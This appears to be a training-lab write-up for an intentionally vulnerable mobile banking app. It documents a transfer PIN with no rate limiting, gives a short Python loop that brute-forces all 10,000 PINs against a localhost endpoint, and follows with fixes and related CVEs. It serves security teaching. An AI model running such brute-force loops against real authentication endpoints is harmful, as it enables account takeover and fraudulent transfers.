# 04 — Brute-forceable transaction PIN

**Category:** Authentication · **MASVS-AUTH-3** · **Difficulty:** medium

## The flaw
`POST /api/transfer` authorizes a transfer with a 4-digit PIN and applies **no
rate limiting, lockout, or backoff**. The entire keyspace is 10,000 values —
trivially brute-forced.

## Exploit
```python
import json, urllib.request
for pin in range(10000):
    body = json.dumps({"pin": f"{pin:04d}"}).encode()
    req = urllib.request.Request("http://127.0.0.1:8000/api/transfer", data=body)
    try:
        print(urllib.request.urlopen(req).read()); break   # 200 => flag
    except urllib.error.HTTPError:
        continue
```

## Fix
Rate-limit and lock out after a few failures, add exponential backoff, prefer
longer secrets / device-bound keys, and require step-up auth (biometric /
server-side OTP) for sensitive actions. Short numeric PINs need server-enforced
attempt limits to mean anything.

## Real-world CVE context (CWE-307)

Missing rate limiting / lockout on authentication is a routine finding. All ids
resolve in the bundled offline OSV DB:

| CVE | Project | What broke |
|-----|---------|------------|
| `CVE-2024-21652` | Multiple | Bypassing rate limit & brute-force protection |
| `CVE-2024-24767` | CasaOS | Password brute-force attack |
| `CVE-2025-60538` | Shiori | Auth bypass via brute force |
| `CVE-2026-26233` | Mattermost | No rate limit on login requests |

```bash
dvmobile cve CVE-2024-24767
dvmobile enrich weak-pin
```

The lab's `/api/transfer` is the same shape: a small secret keyspace with no
server-enforced attempt limit.
